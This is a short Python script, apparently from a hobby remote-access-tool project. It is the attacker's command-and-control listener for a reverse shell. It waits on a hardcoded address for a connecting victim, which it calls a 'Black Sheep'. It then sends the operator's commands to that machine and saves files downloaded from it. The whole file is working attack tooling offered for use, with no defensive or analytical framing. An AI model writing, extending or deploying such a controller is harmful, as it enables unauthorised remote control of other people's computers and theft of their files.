import socket
import marshal

class Server:
	def __init__(self, ip, port):
		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server.bind((ip, port))
		server.listen(0)
		print("[+] Waiting for a Black Sheep......")
		self.connection, address = server.accept()
		print("[+] Found a Black Sheep..."+str(address))

	def reliable_send(self, data):
		marshal_data = marshal.dumps(data)
		self.connection.send(marshal_data)

	def reliable_receive(self):
		marshal_data = bytes("".encode())
		while True:
			try:
				marshal_data = marshal_data+self.connection.recv(1024)
				return marshal.loads(marshal_data)
			except EOFError:
				continue

	def execute_remotely(self, command)	:
		self.reliable_send(command)
		if command[0] == "EXIT":
			self.connection.close()
			exit()
		return self.reliable_receive()

	def write_file(self,path,content):
		with open(path, "wb+") as file:
			file.write(content)
			file.close()
			return "[+]Downloading Black Sheep file"
			

	def run(self):
		while True:
			command = input(">>>")
			command = command.split(" ")
			result = self.execute_remotely(command)#.encode())
			if command[0] == "download":
				result = self.write_file(command[1], result)
			try:
				print(result.decode())	
			except AttributeError:
				print(result)

Server = Server("192.168.1.94", 2463)
Server.run()